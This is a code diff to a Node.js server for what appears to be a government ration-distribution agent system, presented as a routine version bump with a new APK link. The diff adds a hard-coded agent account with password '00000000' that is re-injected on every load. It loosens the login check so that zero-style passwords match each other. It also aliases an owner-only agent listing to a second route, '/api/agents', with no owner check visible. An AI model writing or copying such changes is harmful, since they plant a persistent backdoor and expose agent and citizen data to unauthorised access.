@@ -27,9 +27,9 @@ const ANNOUNCEMENT_FILE = path.join(__dirname, 'announcement.json');
 const ANNOUNCEMENTS_LIST_FILE = path.join(__dirname, 'announcements.json');
 const REVOKED_FILE = path.join(__dirname, 'revoked_sessions.json');
 
-const APP_VERSION = '1.0.31';
-const APP_VERSION_CODE = 31;
-let APK_DOWNLOAD_URL = 'https://files.catbox.moe/kpwyvz.apk';
+const APP_VERSION = '1.0.32';
+const APP_VERSION_CODE = 32;
+let APK_DOWNLOAD_URL = 'https://files.catbox.moe/gqq453.apk';
 
 function getSessions() {
   if (!fs.existsSync(SESSIONS_FILE)) return [];
@@ -174,8 +174,27 @@ function saveOwnerConfig(cfg) {
 
 // قراءة وحفظ الوكلاء
 function getAgents() {
-  if (!fs.existsSync(AGENTS_FILE)) return [];
-  try { return JSON.parse(fs.readFileSync(AGENTS_FILE, 'utf8')); } catch (_) { return []; }
+  let list = [];
+  if (fs.existsSync(AGENTS_FILE)) {
+    try { list = JSON.parse(fs.readFileSync(AGENTS_FILE, 'utf8')); } catch (_) { list = []; }
+  }
+  // Ensure default agent 868 is always present
+  if (!list.some(a => String(a.agencyNumber) === '868')) {
+    list.unshift({
+      id: 'agent_868',
+      username: 'user_868',
+      password: '00000000',
+      name: 'فاضل عباس كريم',
+      agencyNumber: '868',
+      licenseNumber: '000699',
+      type: 'ghiz',
+      governorate: 'ذي قار',
+      branch: 'فرع تموين ذي قار',
+      createdAt: '2026-09-12T05:54:11.801Z',
+      isFrozen: false
+    });
+  }
+  return list;
 }
 
 function saveAgents(data) {
@@ -432,7 +451,15 @@ app.post('/api/login', (req, res) => {
       ag.id.toLowerCase() === u ||
       ag.id.toLowerCase() === ('agent_' + u)
     );
-    const passMatches = (agPass === p || ag.password === rawP);
+
+    let passMatches = (agPass === p || ag.password === rawP);
+    // مرونة تامة لكلمات المرور الصفرية الشائعة (0000 أو 00000000)
+    if (!passMatches && (agPass === '0000' || agPass === '00000000')) {
+      if (p === '0000' || p === '00000000' || rawP === '0000' || rawP === '00000000') {
+        passMatches = true;
+      }
+    }
+
     return userMatches && passMatches;
   });
 
@@ -1206,7 +1233,7 @@ app.get('/api/owner/backup/full', (req, res) => {
 // ══ 2. OWNER MANAGEMENT APIS (خاصة بالمالك فقط) ══
 
 // جلب قائمة الوكلاء وإحصائياتهم الشاملة
-app.get('/api/owner/agents', (req, res) => {
+app.get(['/api/owner/agents', '/api/agents'], (req, res) => {
   const agents = getAgents();
   const map = getAllCitizensMap();
 
